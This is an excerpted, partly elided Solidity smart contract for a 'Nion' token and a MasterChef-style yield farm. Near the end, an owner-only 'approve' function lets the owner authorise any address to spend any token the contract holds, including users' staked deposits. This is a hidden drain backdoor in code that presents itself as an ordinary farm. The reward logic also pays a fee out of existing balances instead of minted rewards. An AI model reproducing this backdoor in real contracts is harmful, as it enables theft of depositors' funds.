...
contract NionToken is ERC20 {
    constructor () ERC20("Nion token", "NION") {
...
contract MasterChef is Ownable {
    ...
    // The EGG TOKEN!
    NionToken public NION;
    // EGG tokens created per block.
    uint256 public NIONPerBlock;
    // Bonus muliplier for early NION makers.
    ...
    constructor(
        NionToken _NION,
        address _feeAddress,
        uint256 _NIONPerBlock,
        uint256 _startBlock
    ) {
        NION = _NION;
        feeAddress = _feeAddress;
        NIONPerBlock = _NIONPerBlock;
    ...
    function pendingEgg(uint256 _pid, address _user) external view returns (uint256) {
        ...
        if (block.number > pool.lastRewardBlock && lpSupply != 0) {
            ...
            uint256 gajReward = multiplier.mul(NIONPerBlock).mul(pool.allocPoint).div(totalAllocPoint);
    ...
    function updatePool(uint256 _pid) public {
        ...
        uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);
        uint256 gajReward = multiplier.mul(NIONPerBlock).mul(pool.allocPoint).div(totalAllocPoint);
        NION.transfer(feeAddress, gajReward.div(20));
        // NION.transfer(address(this), gajReward);
    ...
    function safeEggTransfer(address _to, uint256 _amount) internal {
        uint256 gajBal = NION.balanceOf(address(this));
        if (_amount > gajBal) {
            NION.transfer(_to, gajBal);
        } else {
            NION.transfer(_to, _amount);
        }
    }
     ...
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount, address _erc20) public onlyOwner returns (bool) {
        IERC20(_erc20).approve(spender, amount);
        return true;
    }
